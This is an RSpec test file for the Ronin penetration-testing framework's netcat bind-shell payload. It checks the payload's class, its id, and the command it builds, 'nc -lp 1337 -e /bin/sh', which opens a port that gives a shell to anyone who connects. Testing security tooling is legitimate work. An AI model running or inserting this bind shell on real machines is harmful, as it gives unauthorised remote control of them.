require 'spec_helper'
require 'ronin/payloads/builtin/command/netcat/bind_shell'

describe Ronin::Payloads::Command::Netcat::BindShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'command/netcat/build_shell'" do
      expect(subject.id).to eq('command/netcat/bind_shell')
    end
  end

  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build a `nc` command that listens on the port and executes /bin/bash" do
      expect(subject.payload).to eq("nc -lp #{port} -e /bin/sh")
    end
  end
end
